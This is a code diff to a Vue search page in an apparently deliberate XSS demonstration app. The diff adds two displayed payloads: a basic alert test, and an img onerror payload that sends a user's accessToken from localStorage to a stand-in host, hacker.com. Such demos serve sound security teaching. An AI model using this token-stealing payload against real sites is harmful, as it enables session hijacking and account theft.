@@ -44,11 +44,11 @@
         <h3>⚠️ XSS 演示提示（场景 1/2 反射型 XSS）</h3>
         <p>当前处于 VULN 模式，搜索框存在反射型 XSS 漏洞。</p>
         
-        <p style="margin-top: 12px;"><strong>场景 1 - 基础弹窗验证：</strong></p>
+        <p style="margin-top: 12px;"><strong>场景 1 - Hello, XSS：</strong></p>
         <code>&lt;img src=x onerror=alert(1)&gt;</code>
         
-        <p style="margin-top: 12px;"><strong>场景 2 - 静默画像收集：</strong></p>
-        <code>见文档完整 Payload（含收集器上报逻辑）</code>
+        <p style="margin-top: 12px;"><strong>场景 2 - 窃取用户JWT：</strong></p>
+        <code>&lt;img src=x onerror="new Image().src='http://hacker.com/jwt='+localStorage.getItem('accessToken');"&gt;</code>
         
         <p style="margin-top: 12px; font-size: 0.9em; color: var(--color-text-muted);">
           💡 注意：Vue 中通过 v-html 插入的 &lt;script&gt; 标签不会执行，需使用事件处理器型 payload（如 onerror、onload 等）
@@ -59,7 +59,9 @@
 </template>
 
 <script setup>
-// 搜索页（场景 1/2）：演示反射型 XSS 与静默数据收集
+// 搜索页（场景 1/2）：演示反射型 XSS
+// - 场景 1：Hello, XSS - 基础弹窗验证
+// - 场景 2：窃取用户JWT - 盗取 localStorage 中的 JWT
 import { ref, onMounted } from 'vue';
 import { useRoute, useRouter } from 'vue-router';
 import { useConfigStore } from '@/stores/config';
